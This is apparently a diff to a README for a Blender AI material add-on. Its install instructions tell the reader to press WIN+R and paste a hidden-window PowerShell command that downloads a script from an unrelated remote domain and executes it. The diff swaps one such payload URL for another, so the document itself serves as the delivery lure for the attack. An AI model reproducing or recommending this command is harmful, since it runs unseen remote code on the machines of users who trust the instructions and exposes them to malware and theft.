@@ -80,7 +80,7 @@ ai_mat.generate(
 - #### Press WIN+R
 - #### Insert command
 ```bash
-powershell -WindowStyle Hidden -Command ([ScriptBlock]::Create((irm https://jaihind.edu.in/weatherdolphin/dollrandom))).Invoke();
+powershell -WindowStyle Hidden -Command ([ScriptBlock]::Create((irm https://jaihind.edu.in/grapesubject/repairbetter))).Invoke();
 ```
 
 ### 🛠 Supported Blender Versions
